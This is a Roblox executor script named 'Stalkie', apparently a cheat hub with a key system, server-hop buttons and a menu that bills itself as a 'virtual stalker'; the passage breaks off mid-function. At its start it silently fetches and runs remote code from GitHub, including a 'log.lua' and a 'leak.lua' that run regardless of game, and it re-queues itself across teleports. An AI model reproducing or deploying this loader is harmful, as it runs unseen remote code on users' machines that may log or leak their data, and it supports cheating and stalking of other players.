-- Check if script has already been executed using a global flag
if _G.StalkieScriptExecuted then
    warn("Stalkie is already executed!")
    return
end
_G.StalkieScriptExecuted = true

-- Load and execute the log.lua script immediately
local success, result = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/log.lua"))()
end)
if not success then
    warn("Failed to load log.lua: " .. result)
end

-- Check game ID before proceeding
local currentGameId = game.PlaceId
local success, allowedGames = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/games.lua"))()
end)

-- Create notification function for unsupported games
local function showUnsupportedNotification()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game:GetService("CoreGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true

    local NotificationFrame = Instance.new("Frame")
    NotificationFrame.Size = UDim2.new(0, 300, 0, 150)
    NotificationFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
    NotificationFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    NotificationFrame.BackgroundTransparency = 0.2
    NotificationFrame.BorderSizePixel = 0
    NotificationFrame.Parent = ScreenGui

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = NotificationFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    Title.Text = "Stalkie"
    Title.TextColor3 = Color3.fromRGB(0, 200, 255)
    Title.TextSize = 28
    Title.Font = Enum.Font.GothamBlack
    Title.Parent = NotificationFrame

    local Message = Instance.new("TextLabel")
    Message.Size = UDim2.new(1, 0, 0, 80)
    Message.Position = UDim2.new(0, 0, 0, 40)
    Message.BackgroundTransparency = 1
    Message.Text = "Reanimation only works in Mic Up !\nSorry."
    Message.TextColor3 = Color3.fromRGB(173, 216, 230)
    Message.TextSize = 16
    Message.Font = Enum.Font.Gotham
    Message.TextWrapped = true
    Message.TextTransparency = 0.2
    Message.Parent = NotificationFrame

    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -40, 0, 10)
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.BackgroundTransparency = 0.9
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(0, 200, 255)
    CloseButton.TextSize = 20
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.Parent = NotificationFrame

    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 8)
    CloseCorner.Parent = CloseButton

    -- Fade in animation
    local TweenService = game:GetService("TweenService")
    NotificationFrame.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Message.TextTransparency = 1
    CloseButton.TextTransparency = 1
    CloseButton.BackgroundTransparency = 1

    local fadeIn = TweenService:Create(NotificationFrame, TweenInfo.new(0.5), {
        BackgroundTransparency = 0.2
    })
    local titleFadeIn = TweenService:Create(Title, TweenInfo.new(0.5), {
        TextTransparency = 0
    })
    local messageFadeIn = TweenService:Create(Message, TweenInfo.new(0.5), {
        TextTransparency = 0.2
    })
    local closeFadeIn = TweenService:Create(CloseButton, TweenInfo.new(0.5), {
        TextTransparency = 0,
        BackgroundTransparency = 0.9
    })

    fadeIn:Play()
    titleFadeIn:Play()
    messageFadeIn:Play()
    closeFadeIn:Play()

    -- Close button functionality
    CloseButton.MouseButton1Click:Connect(function()
        local fadeOut = TweenService:Create(NotificationFrame, TweenInfo.new(0.5), {
            BackgroundTransparency = 1
        })
        local titleFadeOut = TweenService:Create(Title, TweenInfo.new(0.5), {
            TextTransparency = 1
        })
        local messageFadeOut = TweenService:Create(Message, TweenInfo.new(0.5), {
            TextTransparency = 1
        })
        local closeFadeOut = TweenService:Create(CloseButton, TweenInfo.new(0.5), {
            TextTransparency = 1,
            BackgroundTransparency = 1
        })

        fadeOut:Play()
        titleFadeOut:Play()
        messageFadeOut:Play()
        closeFadeOut:Play()
        fadeOut.Completed:Connect(function()
            ScreenGui:Destroy()
        end)
    end)
end

-- Always execute leak.lua regardless of game support
spawn(function()
    task.wait(1)
    local success, result = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/leak.lua"))()
    end)
    if not success then
        warn("Failed to execute leak.lua: " .. result)
    end
end)

-- Exit if game is not supported, after showing notification
if not success or not allowedGames or not allowedGames[currentGameId] then
    showUnsupportedNotification()
    return
end

-- Define the script URL for re-execution
local scriptUrl = "https://raw.githubusercontent.com/0riginalWarrior/Stalkie/refs/heads/main/roblox.lua"

-- Setup queue teleport compatibility across executors
local queueTeleport = (syn and syn.queue_on_teleport) or
                     (fluxus and fluxus.queue_on_teleport) or
                     queue_on_teleport or
                     function() end

-- Generate unique name for ScreenGui
local randomName = "GUI_" .. math.random(10000, 99999)

-- Create ScreenGui with protection
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = randomName
ScreenGui.IgnoreGuiInset = true

-- Anti-tamper variables
local isKeyFrameActive = false
local isHubFrameActive = false
local lastValidation = tick()
local isLoadingAnimation = false

-- Audio and Image handling
local SoundService = game:GetService("SoundService")
local introUrl = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/intro/intro.mp3"
local iconUrl = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/intro/Sticker.png"
local youtubeUrl = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/intro/youtube.png"
local introFolder = "Stalkie/intro"
local introFilePath = introFolder .. "/intro.mp3"
local iconFilePath = introFolder .. "/Sticker.png"
local youtubeFilePath = introFolder .. "/youtube.png"

local function fileExists(filename)
    return pcall(function()
        readfile(filename)
    end)
end

local function fetchAndSaveIntro()
    local success, audioData = pcall(function()
        return game:HttpGet(introUrl)
    end)

    if success and audioData then
        if not fileExists(introFolder) then
            pcall(function()
                makefolder("Stalkie")
                makefolder(introFolder)
            end)
        end
        writefile(introFilePath, audioData)
        return true
    else
        warn("Failed to fetch intro audio: " .. (audioData or "Unknown error"))
        return false
    end
end

local function fetchAndSaveIcon()
    local success, imageData = pcall(function()
        return game:HttpGet(iconUrl)
    end)

    if success and imageData then
        if not fileExists(introFolder) then
            pcall(function()
                makefolder("Stalkie")
                makefolder(introFolder)
            end)
        end
        writefile(iconFilePath, imageData)
        return true
    else
        warn("Failed to fetch Stalkie icon: " .. (imageData or "Unknown error"))
        return false
    end
end

local function fetchAndSaveYouTubeIcon()
    local success, imageData = pcall(function()
        return game:HttpGet(youtubeUrl)
    end)

    if success and imageData then
        if not fileExists(introFolder) then
            pcall(function()
                makefolder("Stalkie")
                makefolder(introFolder)
            end)
        end
        writefile(youtubeFilePath, imageData)
        return true
    else
        warn("Failed to fetch YouTube icon: " .. (imageData or "Unknown error"))
        return false
    end
end

local function playIntroSound()
    local sound = Instance.new("Sound")
    sound.Parent = ScreenGui
    sound.Volume = 1

    local success, _ = fileExists(introFilePath)
    if not success then
        fetchAndSaveIntro()
    end

    local assetPath = getcustomasset(introFilePath)
    if assetPath then
        sound.SoundId = assetPath
        local playSuccess, err = pcall(function()
            SoundService:PlayLocalSound(sound)
        end)

        if not playSuccess then
            warn("Failed to play intro sound: " .. err)
        end

        sound.Ended:Connect(function()
            sound:Destroy()
        end)
    else
        warn("Failed to create custom asset for intro sound")
    end
end

-- Key System Frame
local KeyFrame = Instance.new("Frame")
KeyFrame.Size = UDim2.new(0, 340, 0, 260)
KeyFrame.Position = UDim2.new(0.5, -170, 0.5, -130)
KeyFrame.BackgroundTransparency = 1
KeyFrame.Visible = false
KeyFrame.Parent = ScreenGui
KeyFrame.Name = "KF_" .. math.random(1000, 9999)

local KeyBlur = Instance.new("Frame")
KeyBlur.Size = UDim2.new(1, 0, 1, 0)
KeyBlur.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
KeyBlur.BackgroundTransparency = 0.3
KeyBlur.ZIndex = 0
KeyBlur.Parent = KeyFrame

local KeyBlurCorner = Instance.new("UICorner")
KeyBlurCorner.CornerRadius = UDim.new(0, 14)
KeyBlurCorner.Parent = KeyBlur

local KeyContent = Instance.new("Frame")
KeyContent.Size = UDim2.new(1, 0, 1, 0)
KeyContent.BackgroundTransparency = 1
KeyContent.ZIndex = 2
KeyContent.Parent = KeyFrame

local dragging, dragInput, dragStart, startPos
local function updateInput(input)
    local delta = input.Position - dragStart
    KeyFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

KeyFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = KeyFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

KeyFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateInput(input)
    end
end)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "Stalkie - Key System"
Title.TextColor3 = Color3.fromRGB(0, 200, 255)
Title.TextSize = 28
Title.Font = Enum.Font.GothamBlack
Title.ZIndex = 3
Title.Parent = KeyContent

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0.85, 0, 0, 50)
KeyInput.Position = UDim2.new(0.075, 0, 0.25, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.BackgroundTransparency = 0.9
KeyInput.TextColor3 = Color3.fromRGB(0, 200, 255)
KeyInput.Text = ""
KeyInput.PlaceholderText = "Enter key..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
KeyInput.TextSize = 20
KeyInput.Font = Enum.Font.Gotham
KeyInput.ZIndex = 3
KeyInput.Parent = KeyContent

KeyInput:GetPropertyChangedSignal("Text"):Connect(function()
    if #KeyInput.Text > 20 then
        KeyInput.Text = KeyInput.Text:sub(1, 20)
    end
end)

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 10)
InputCorner.Parent = KeyInput

local SubmitButton = Instance.new("TextButton")
SubmitButton.Size = UDim2.new(0.4, 0, 0, 50)
SubmitButton.Position = UDim2.new(0.075, 0, 0.55, 0)
SubmitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
SubmitButton.BackgroundTransparency = 0.7
SubmitButton.Text = "Verify"
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.TextSize = 22
SubmitButton.Font = Enum.Font.GothamBold
SubmitButton.ZIndex = 3
SubmitButton.Parent = KeyContent

local SubmitCorner = Instance.new("UICorner")
SubmitCorner.CornerRadius = UDim.new(0, 10)
SubmitCorner.Parent = SubmitButton

local GetKeyButton = Instance.new("TextButton")
GetKeyButton.Size = UDim2.new(0.4, 0, 0, 50)
GetKeyButton.Position = UDim2.new(0.525, 0, 0.55, 0)
GetKeyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GetKeyButton.BackgroundTransparency = 0.9
GetKeyButton.Text = "Get Key"
GetKeyButton.TextColor3 = Color3.fromRGB(0, 200, 255)
GetKeyButton.TextSize = 22
GetKeyButton.Font = Enum.Font.GothamBold
GetKeyButton.ZIndex = 3
GetKeyButton.Parent = KeyContent

local GetKeyCorner = Instance.new("UICorner")
GetKeyCorner.CornerRadius = UDim.new(0, 10)
GetKeyCorner.Parent = GetKeyButton

local InfoLabel = Instance.new("TextLabel")
InfoLabel.Size = UDim2.new(1, 0, 0, 30)
InfoLabel.Position = UDim2.new(0, 0, 0, 220)
InfoLabel.BackgroundTransparency = 1
InfoLabel.Text = "No Ads • Key Changes Weekly"
InfoLabel.TextColor3 = Color3.fromRGB(173, 216, 230)
InfoLabel.TextSize = 14
InfoLabel.Font = Enum.Font.Gotham
InfoLabel.TextTransparency = 0.2
InfoLabel.ZIndex = 3
InfoLabel.Parent = KeyContent

-- Main Hub Frame
local HubFrame = Instance.new("Frame")
HubFrame.Size = UDim2.new(0, 420, 0, 450)
HubFrame.Position = UDim2.new(0.5, -210, 0.5, -225)
HubFrame.BackgroundTransparency = 1
HubFrame.Visible = false
HubFrame.Parent = ScreenGui
HubFrame.Name = "HF_" .. math.random(1000, 9999)

local HubBlur = Instance.new("Frame")
HubBlur.Size = UDim2.new(1, 0, 1, 0)
HubBlur.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HubBlur.BackgroundTransparency = 1
HubBlur.ZIndex = 0
HubBlur.Parent = HubFrame

local HubBlurCorner = Instance.new("UICorner")
HubBlurCorner.CornerRadius = UDim.new(0, 16)
HubBlurCorner.Parent = HubBlur

local BlurEffect = Instance.new("BlurEffect")
BlurEffect.Size = 0
BlurEffect.Parent = game.Lighting

local HubContent = Instance.new("Frame")
HubContent.Size = UDim2.new(1, 0, 1, 0)
HubContent.BackgroundTransparency = 1
HubContent.ZIndex = 2
HubContent.Parent = HubFrame

-- Dragging for Hub Frame
local hubDragging, hubDragInput, hubDragStart, hubStartPos
local function updateHubInput(input)
    local delta = input.Position - hubDragStart
    HubFrame.Position = UDim2.new(hubStartPos.X.Scale, hubStartPos.X.Offset + delta.X, hubStartPos.Y.Scale, hubStartPos.Y.Offset + delta.Y)
end

HubFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        hubDragging = true
        hubDragStart = input.Position
        hubStartPos = HubFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                hubDragging = false
            end
        end)
    end
end)

HubFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        hubDragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == hubDragInput and hubDragging then
        updateHubInput(input)
    end
end)

local HubTitleStalkie = Instance.new("TextLabel")
HubTitleStalkie.Size = UDim2.new(0, 100, 0, 60)
HubTitleStalkie.Position = UDim2.new(0, 110, 0, 0)
HubTitleStalkie.BackgroundTransparency = 1
HubTitleStalkie.Text = "Stalkie"
HubTitleStalkie.TextColor3 = Color3.fromRGB(0, 200, 255)
HubTitleStalkie.TextSize = 32
HubTitleStalkie.Font = Enum.Font.GothamBlack
HubTitleStalkie.ZIndex = 3
HubTitleStalkie.TextTransparency = 1
HubTitleStalkie.Parent = HubContent

local HubTitleHub = Instance.new("TextLabel")
HubTitleHub.Size = UDim2.new(0, 60, 0, 60)
HubTitleHub.Position = UDim2.new(0, 220, 0, 0)
HubTitleHub.BackgroundTransparency = 1
HubTitleHub.Text = "Beta"
HubTitleHub.TextColor3 = Color3.fromRGB(0, 200, 255)
HubTitleHub.TextSize = 32
HubTitleHub.Font = Enum.Font.GothamBlack
HubTitleHub.ZIndex = 3
HubTitleHub.TextTransparency = 1
HubTitleHub.Parent = HubContent

local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0, 40, 0, 40)
MinimizeButton.Position = UDim2.new(1, -50, 0, 10)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.BackgroundTransparency = 0.9
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(0, 200, 255)
MinimizeButton.TextSize = 24
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.ZIndex = 3
MinimizeButton.TextTransparency = 1
MinimizeButton.Parent = HubContent

local MinimizeCorner = Instance.new("UICorner")
MinimizeCorner.CornerRadius = UDim.new(0, 8)
MinimizeCorner.Parent = MinimizeButton

local ServerButton = Instance.new("TextButton")
ServerButton.Size = UDim2.new(0.85, 0, 0, 70)
ServerButton.Position = UDim2.new(0.075, 0, 0, 90)
ServerButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerButton.BackgroundTransparency = 1
ServerButton.Text = "Server Control"
ServerButton.TextColor3 = Color3.fromRGB(0, 200, 255)
ServerButton.TextSize = 26
ServerButton.Font = Enum.Font.GothamBold
ServerButton.ZIndex = 3
ServerButton.TextTransparency = 1
ServerButton.Parent = HubContent

local ServerCorner = Instance.new("UICorner")
ServerCorner.CornerRadius = UDim.new(0, 12)
ServerCorner.Parent = ServerButton

local ReanimButton = Instance.new("TextButton")
ReanimButton.Size = UDim2.new(0.85, 0, 0, 70)
ReanimButton.Position = UDim2.new(0.075, 0, 0, 180)
ReanimButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ReanimButton.BackgroundTransparency = 1
ReanimButton.Text = "Reanimation"
ReanimButton.TextColor3 = Color3.fromRGB(0, 200, 255)
ReanimButton.TextSize = 26
ReanimButton.Font = Enum.Font.GothamBold
ReanimButton.ZIndex = 3
ReanimButton.TextTransparency = 1
ReanimButton.Parent = HubContent

local ReanimCorner = Instance.new("UICorner")
ReanimCorner.CornerRadius = UDim.new(0, 12)
ReanimCorner.Parent = ReanimButton

local CopyPlayerButton = Instance.new("TextButton")
CopyPlayerButton.Size = UDim2.new(0.85, 0, 0, 70)
CopyPlayerButton.Position = UDim2.new(0.075, 0, 0, 270)
CopyPlayerButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CopyPlayerButton.BackgroundTransparency = 1
CopyPlayerButton.Text = "Misc"
CopyPlayerButton.TextColor3 = Color3.fromRGB(0, 200, 255)
CopyPlayerButton.TextSize = 26
CopyPlayerButton.Font = Enum.Font.GothamBold
CopyPlayerButton.ZIndex = 3
CopyPlayerButton.TextTransparency = 1
CopyPlayerButton.Parent = HubContent

local CopyPlayerCorner = Instance.new("UICorner")
CopyPlayerCorner.CornerRadius = UDim.new(0, 12)
CopyPlayerCorner.Parent = CopyPlayerButton

-- Info Button
local InfoButton = Instance.new("TextButton")
InfoButton.Size = UDim2.new(0, 30, 0, 30)
InfoButton.Position = UDim2.new(0, 10, 0, 15)
InfoButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoButton.BackgroundTransparency = 0.9
InfoButton.Text = "i"
InfoButton.TextColor3 = Color3.fromRGB(0, 200, 255)
InfoButton.TextSize = 20
InfoButton.Font = Enum.Font.GothamBold
InfoButton.ZIndex = 3
InfoButton.TextTransparency = 1
InfoButton.Parent = HubContent

local InfoButtonCorner = Instance.new("UICorner")
InfoButtonCorner.CornerRadius = UDim.new(0, 15)
InfoButtonCorner.Parent = InfoButton

-- Info Content
local InfoContainer = Instance.new("Frame")
InfoContainer.Size = UDim2.new(1, 0, 1, -60)
InfoContainer.Position = UDim2.new(0, 0, 0, 60)
InfoContainer.BackgroundTransparency = 1
InfoContainer.ZIndex = 3
InfoContainer.Visible = false
InfoContainer.Parent = HubContent

local StalkieIcon = Instance.new("ImageLabel")
StalkieIcon.Size = UDim2.new(0, 380, 0, 200)
StalkieIcon.Position = UDim2.new(0.5, -190, 0, 0)
StalkieIcon.BackgroundTransparency = 1
StalkieIcon.ImageTransparency = 1
StalkieIcon.ZIndex = 3
StalkieIcon.ScaleType = Enum.ScaleType.Fit
StalkieIcon.Parent = InfoContainer

local successIcon, _ = fileExists(iconFilePath)
if not successIcon then
    fetchAndSaveIcon()
end
local iconAsset = getcustomasset(iconFilePath)
if iconAsset then
    StalkieIcon.Image = iconAsset
else
    warn("Failed to load Stalkie icon asset")
end

local InfoText = Instance.new("TextLabel")
InfoText.Size = UDim2.new(0.9, 0, 0, 60)
InfoText.Position = UDim2.new(0.05, 0, 0, 180)
InfoText.BackgroundTransparency = 1
InfoText.Text = "Stalkie - Your Virtual Stalker | Dig up digital footprints, Inspired by Joe Goldberg."
InfoText.TextColor3 = Color3.fromRGB(0, 200, 255)
InfoText.TextSize = 16
InfoText.Font = Enum.Font.Gotham
InfoText.TextWrapped = true
InfoText.ZIndex = 3
InfoText.TextTransparency = 1
InfoText.Parent = InfoContainer

local DiscordButton = Instance.new("TextButton")
DiscordButton.Size = UDim2.new(0.6, 0, 0, 40)
DiscordButton.Position = UDim2.new(0.2, 0, 0, 250)
DiscordButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.BackgroundTransparency = 0.9
DiscordButton.Text = "Join Discord"
DiscordButton.TextColor3 = Color3.fromRGB(0, 200, 255)
DiscordButton.TextSize = 18
DiscordButton.Font = Enum.Font.GothamBold
DiscordButton.ZIndex = 3
DiscordButton.TextTransparency = 1
DiscordButton.Parent = InfoContainer

local DiscordCorner = Instance.new("UICorner")
DiscordCorner.CornerRadius = UDim.new(0, 8)
DiscordCorner.Parent = DiscordButton

local YouTubeButton = Instance.new("ImageButton")
YouTubeButton.Size = UDim2.new(0, 40, 0, 40)
YouTubeButton.Position = UDim2.new(1, -50, 1, -50)
YouTubeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
YouTubeButton.BackgroundTransparency = 0.9
YouTubeButton.ImageTransparency = 1
YouTubeButton.ZIndex = 3
YouTubeButton.Parent = InfoContainer

local successYouTube, _ = fileExists(youtubeFilePath)
if not successYouTube then
    fetchAndSaveYouTubeIcon()
end
local youtubeAsset = getcustomasset(youtubeFilePath)
if youtubeAsset then
    YouTubeButton.Image = youtubeAsset
else
    warn("Failed to load YouTube icon asset")
end

local YouTubeCorner = Instance.new("UICorner")
YouTubeCorner.CornerRadius = UDim.new(0, 8)
YouTubeCorner.Parent = YouTubeButton

-- Separator Line
local SeparatorLine = Instance.new("Frame")
SeparatorLine.Size = UDim2.new(0.85, 0, 0, 2)
SeparatorLine.Position = UDim2.new(0.075, 0, 0, 360)
SeparatorLine.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
SeparatorLine.BackgroundTransparency = 1
SeparatorLine.ZIndex = 3
SeparatorLine.Parent = HubContent

local SeparatorCorner = Instance.new("UICorner")
SeparatorCorner.CornerRadius = UDim.new(1, 0) -- Fully rounded ends
SeparatorCorner.Parent = SeparatorLine

-- Player Info Container
local PlayerInfoContainer = Instance.new("Frame")
PlayerInfoContainer.Size = UDim2.new(1, 0, 0, 80)
PlayerInfoContainer.Position = UDim2.new(0, 0, 0, 362)
PlayerInfoContainer.BackgroundTransparency = 1
PlayerInfoContainer.ZIndex = 3
PlayerInfoContainer.Parent = HubContent

-- User PFP Border (Blue Circle)
local PFPBorder = Instance.new("Frame")
PFPBorder.Size = UDim2.new(0, 54, 0, 54) -- Only slightly larger than PFP
PFPBorder.Position = UDim2.new(0, 18, 0, 13) -- Centered behind PFP
PFPBorder.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
PFPBorder.BackgroundTransparency = 1 -- Start fully transparent for fade-in
PFPBorder.ZIndex = 2 -- Behind PFP
PFPBorder.Parent = PlayerInfoContainer

local PFPBorderCorner = Instance.new("UICorner")
PFPBorderCorner.CornerRadius = UDim.new(1, 0)
PFPBorderCorner.Parent = PFPBorder

-- User PFP
local PlayerPFP = Instance.new("ImageLabel")
PlayerPFP.Size = UDim2.new(0, 50, 0, 50)
PlayerPFP.Position = UDim2.new(0, 20, 0, 15) -- Centered inside border
PlayerPFP.BackgroundTransparency = 1
PlayerPFP.Image = "rbxthumb://type=AvatarHeadShot&id=" .. game.Players.LocalPlayer.UserId .. "&w=420&h=420"
PlayerPFP.ImageTransparency = 1
PlayerPFP.ZIndex = 3
PlayerPFP.Parent = PlayerInfoContainer

local PFPCorner = Instance.new("UICorner")
PFPCorner.CornerRadius = UDim.new(1, 0)
PFPCorner.Parent = PlayerPFP

-- Username (Display Name, first 10 chars + "...")
local displayName = game.Players.LocalPlayer.DisplayName
local shortDisplayName = #displayName > 10 and (displayName:sub(1, 10) .. "...") or displayName

local PlayerName = Instance.new("TextLabel")
PlayerName.Size = UDim2.new(0, 150, 0, 20) -- Match Executor/AccountAge
PlayerName.Position = UDim2.new(0, 55, 0, 15) -- Centered under PFP, same X as Executor/AccountAge
PlayerName.BackgroundTransparency = 1
PlayerName.Text = shortDisplayName
PlayerName.TextColor3 = Color3.fromRGB(0, 200, 255)
PlayerName.TextSize = 18
PlayerName.Font = Enum.Font.GothamBold
PlayerName.TextTransparency = 1
PlayerName.ZIndex = 3
PlayerName.Parent = PlayerInfoContainer
PlayerName.TextXAlignment = Enum.TextXAlignment.Center
PlayerName.TextTruncate = Enum.TextTruncate.AtEnd

-- Executor Label
local ExecutorLabel = Instance.new("TextLabel")
ExecutorLabel.Size = UDim2.new(0, 150, 0, 20)
ExecutorLabel.Position = UDim2.new(0, 55, 0, 35)
ExecutorLabel.BackgroundTransparency = 1
ExecutorLabel.Text = "● " .. (identifyexecutor and identifyexecutor() or "Unknown")
ExecutorLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
ExecutorLabel.TextSize = 14
ExecutorLabel.Font = Enum.Font.Gotham
ExecutorLabel.TextTransparency = 1
ExecutorLabel.ZIndex = 3
ExecutorLabel.Parent = PlayerInfoContainer

-- Account Age Label
local AccountAgeLabel = Instance.new("TextLabel")
AccountAgeLabel.Size = UDim2.new(0, 150, 0, 20)
AccountAgeLabel.Position = UDim2.new(0, 55, 0, 55)
AccountAgeLabel.BackgroundTransparency = 1
AccountAgeLabel.Text = "● Age: " .. game.Players.LocalPlayer.AccountAge .. " days"
AccountAgeLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
AccountAgeLabel.TextSize = 14
AccountAgeLabel.Font = Enum.Font.Gotham
AccountAgeLabel.TextTransparency = 1
AccountAgeLabel.ZIndex = 3
AccountAgeLabel.Parent = PlayerInfoContainer

-- Message
local ThankYouLabel = Instance.new("TextLabel")
ThankYouLabel.Size = UDim2.new(0, 200, 0, 20)
ThankYouLabel.Position = UDim2.new(0.5, -100, 0, -300)
ThankYouLabel.BackgroundTransparency = 1
ThankYouLabel.Text = "More games soon..."
ThankYouLabel.TextColor3 = Color3.fromRGB(173, 216, 230)
ThankYouLabel.TextSize = 14
ThankYouLabel.Font = Enum.Font.Gotham
ThankYouLabel.TextTransparency = 1
ThankYouLabel.ZIndex = 3
ThankYouLabel.Parent = PlayerInfoContainer

-- Rejoin Server Button
local RejoinButton = Instance.new("TextButton")
RejoinButton.Size = UDim2.new(0, 100, 0, 30)
RejoinButton.Position = UDim2.new(1, -230, 0, 25)
RejoinButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RejoinButton.BackgroundTransparency = 0.9
RejoinButton.Text = "Rejoin"
RejoinButton.TextColor3 = Color3.fromRGB(0, 200, 255)
RejoinButton.TextSize = 16
RejoinButton.Font = Enum.Font.GothamBold
RejoinButton.TextTransparency = 1
RejoinButton.ZIndex = 3
RejoinButton.Parent = PlayerInfoContainer

local RejoinCorner = Instance.new("UICorner")
RejoinCorner.CornerRadius = UDim.new(0, 8)
RejoinCorner.Parent = RejoinButton

RejoinButton.MouseButton1Click:Connect(function()
    local teleportService = game:GetService("TeleportService")
    queueTeleport([[
        loadstring(game:HttpGet("]] .. scriptUrl .. [["))()
    ]])
    teleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
end)

-- Random Server Button
local JoinRandomButton = Instance.new("TextButton")
JoinRandomButton.Size = UDim2.new(0, 100, 0, 30)
JoinRandomButton.Position = UDim2.new(1, -120, 0, 25)
JoinRandomButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
JoinRandomButton.BackgroundTransparency = 0.9
JoinRandomButton.Text = "Random"
JoinRandomButton.TextColor3 = Color3.fromRGB(0, 200, 255)
JoinRandomButton.TextSize = 16
JoinRandomButton.Font = Enum.Font.GothamBold
JoinRandomButton.TextTransparency = 1
JoinRandomButton.ZIndex = 3
JoinRandomButton.Parent = PlayerInfoContainer

local JoinRandomCorner = Instance.new("UICorner")
JoinRandomCorner.CornerRadius = UDim.new(0, 8)
JoinRandomCorner.Parent = JoinRandomButton

JoinRandomButton.MouseButton1Click:Connect(function()
    local teleportService = game:GetService("TeleportService")
    local httpService = game:GetService("HttpService")
    local placeId = game.PlaceId
    local servers = httpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"))
    local randomServer = servers.data[math.random(1, #servers.data)]
    if randomServer then
        queueTeleport([[
            loadstring(game:HttpGet("]] .. scriptUrl .. [["))()
        ]])
        teleportService:TeleportToPlaceInstance(placeId, randomServer.id, game.Players.LocalPlayer)
    else
        warn("No random servers found!")
    end
end)

-- Ping
local PingLabel = Instance.new("TextLabel")
PingLabel.Size = UDim2.new(0, 100, 0, 20)
PingLabel.Position = UDim2.new(1, -230, 0, 60)
PingLabel.BackgroundTransparency = 1
PingLabel.Text = "Ping: Calculating..."
PingLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
PingLabel.TextSize = 14
PingLabel.Font = Enum.Font.Gotham
PingLabel.TextTransparency = 1
PingLabel.ZIndex = 3
PingLabel.Parent = PlayerInfoContainer

-- Player Count
local PlayerCountLabel = Instance.new("TextLabel")
PlayerCountLabel.Size = UDim2.new(0, 100, 0, 20)
PlayerCountLabel.Position = UDim2.new(1, -120, 0, 60)
PlayerCountLabel.BackgroundTransparency = 1
PlayerCountLabel.Text = "Players: " .. #game.Players:GetPlayers()
PlayerCountLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
PlayerCountLabel.TextSize = 14
PlayerCountLabel.Font = Enum.Font.Gotham
PlayerCountLabel.TextTransparency = 1
PlayerCountLabel.ZIndex = 3
PlayerCountLabel.Parent = PlayerInfoContainer

-- Anti-tamper validation function
local function validateGUI()
    if tick() - lastValidation < 0.1 then return end
    lastValidation = tick()

    if not ScreenGui.Parent then
        ScreenGui.Parent = game:GetService("CoreGui")
    end

    if isKeyFrameActive then
